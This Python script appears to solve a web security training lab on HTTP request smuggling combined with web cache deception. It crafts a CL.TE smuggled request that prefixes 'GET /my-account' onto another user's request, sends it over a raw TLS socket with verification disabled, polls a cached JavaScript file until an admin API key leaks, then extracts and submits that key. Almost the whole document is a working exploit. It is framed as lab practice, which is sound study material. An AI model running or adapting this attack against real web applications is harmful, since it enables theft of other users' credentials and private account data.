# Exploiting HTTP request smuggling to perform web cache deception

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
import socket
import ssl

warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def reset_requests(url):
	print('\n')
	for t in range(1, 11):
		sys.stdout.flush()
		time.sleep(.5)
		r = requests.get('https://' + url + '/',  verify=False)
		status = r.status_code
		sys.stdout.write('\r[+] Reseting response queue... %s\t=>\t%s' % (str(t), str(status)))
	sys.stdout.flush()
	print('\n')


def send_posts(url):
	for i in range(1, 4):
		r = requests.post(url, proxies=proxies, verify=False)

def submit_key(url, key):
	print('[+] Trying to submit the API Key to solve the lab...')
	submit_path = 'https://' + url + '/submitSolution'
	submit_data = {"answer": key}
	r = requests.post(submit_path, data=submit_data, proxies=proxies, verify=False)
	print(r)
	return r

def build_request(url):
	request_body = '0\r\n'
	request_body += '\r\n'
	request_body += 'GET /my-account HTTP/1.1\r\n'
	request_body += 'X-Ignore: X'
	
	request_content = 'POST / HTTP/1.1\r\n'
	request_content += 'Host: ' + url + '\r\n'
	request_content += 'Content-Type: application/x-www-form-urlencoded\r\n'
	request_content += 'Content-Length: ' + str(len(request_body)) + '\r\n'
	request_content += 'Transfer-Encoding: chunked\r\n'
	request_content += '\r\n'
	request_content += request_body
	print("------------------------------------------------------")
	print(request_content)
	print("------------------------------------------------------")
	return request_content

def send_smuggling(request_content, host, port):
	context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
	context.check_hostname = False
	context.verify_mode = ssl.CERT_NONE
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock = context.wrap_socket(sock, server_hostname=host)
	sock.connect((host, port))
	sock.sendall(request_content.encode())
	resp = sock.recv(256)
	print(' '.join(resp.decode().split(None,3)[0:3]))
	resp_code = ' '.join(resp.decode().split(None,3)[0:3])
	if "302" in resp_code:
		print(resp)
	sock.close()
	return resp_code

def main():
	print('[+] Lab: Exploiting HTTP request smuggling to perform web cache deception')
	try:
		url = sys.argv[1].strip()
	except IndexError:
		print('[+] Usage: %s <URL>' % sys.argv[0])
		sys.exit(-1)
	s = requests.Session()
	s.proxies = proxies
	s.verify = False
	r = s.get(url, allow_redirects=False)
	time.sleep(1)
	if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
		print('\n[-] HOST seems to be down (or proxy missconfigured) <!>')
		sys.exit(-1)
	else:
		parsed_url = urllib.parse.urlparse(url)
		subdomain = parsed_url.netloc
		if parsed_url.port:
			port = parsed_url.port
		elif parsed_url.scheme == "https":
			port = 443
		elif parsed_url.scheme == "http":
			port = 80
		print(parsed_url)
		request_content = build_request(subdomain)
		reset_requests(subdomain)
		found = False
		while found is False:
			print('[+] Trying send HTTP Request Smuggling attack to steal admin API Key...\n')
			r = send_smuggling(request_content, subdomain, port)
			time.sleep(1)
			print(r)
			send_posts(url)
			time.sleep(4)
			r = requests.get("https://" + subdomain + "/resources/js/tracking.js", verify=False, proxies=proxies)
			time.sleep(1)
			print(r)
			if 'Your API Key' in r.text:
				key = re.search('Your API Key is: (.*)</div', r.text).group(1)
				print('[+] Found API Key:\t%s' % key)
				found = True
		submit_key(subdomain, key)
		r = requests.get(url, proxies=proxies, verify=False)
		if 'Congratulations, you solved the lab!' in r.text:
			print('\n[+] The lab is solved !')

if __name__ == "__main__":
	main()
